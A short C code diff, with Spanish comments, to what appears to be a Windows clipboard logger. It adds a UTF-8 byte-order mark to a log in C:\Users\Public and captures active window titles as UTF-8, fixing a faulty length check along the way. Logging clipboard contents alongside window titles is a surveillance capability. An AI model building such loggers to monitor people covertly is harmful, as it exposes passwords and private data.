@@ -14,8 +14,17 @@ BOOL OpenClipboardLog(void)
     snprintf(logPath, sizeof(logPath), "C:\\Users\\Public\\clipboard.log");
 
     // Abrir el archivo de log de forma segura
-    if (fopen_s(&g_clipboardState.clipboardFile, logPath, "a") != 0 || !g_clipboardState.clipboardFile)
+    if (fopen_s(&g_clipboardState.clipboardFile, logPath, "ab+") != 0 || !g_clipboardState.clipboardFile)
         return FALSE;
+
+    // Escribir BOM si está vacío
+    if (fseek(g_clipboardState.clipboardFile, 0, SEEK_END) == 0) {
+        long size = ftell(g_clipboardState.clipboardFile);
+        if (size == 0) {
+            unsigned char bom[3] = {0xEF,0xBB,0xBF};
+            fwrite(bom,1,3,g_clipboardState.clipboardFile);
+        }
+    }
 
     // Obtener tiempo actual y escribir cabecera de inicio
     time(&currentTime);
@@ -51,8 +60,13 @@ static BOOL getActiveWindowTitle(char *buffer, size_t bufSize)
     if (!activeWindow)
         return FALSE;
     
-    titleLength = GetWindowTextA(activeWindow, buffer, (int)bufSize);
-    if (!titleLength <= 0) {
+    WCHAR wTitle[256];
+    titleLength = GetWindowTextW(activeWindow, wTitle, (int)(sizeof(wTitle)/sizeof(WCHAR)));
+    if (titleLength <= 0) {
+        strcpy_s(buffer, bufSize, "Unknown Window");
+        return FALSE;
+    }
+    if (WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, buffer, (int)bufSize, NULL, NULL) <= 0) {
         strcpy_s(buffer, bufSize, "Unknown Window");
         return FALSE;
     }
